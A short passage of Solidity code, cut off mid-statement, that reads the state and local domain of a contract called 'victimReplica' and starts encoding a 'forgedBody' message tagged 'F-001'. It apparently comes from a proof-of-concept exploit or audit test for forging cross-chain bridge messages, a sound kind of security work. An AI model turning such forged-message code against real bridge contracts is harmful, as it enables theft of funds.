        stateBefore = _readUint8(victimReplica, abi.encodeWithSignature("state()"));
        localDomain = _readUint32(victimReplica, abi.encodeWithSignature("localDomain()"));

        bytes memory forgedBody = abi.encode(
            bytes4(keccak256("F-001")),
            address(this),
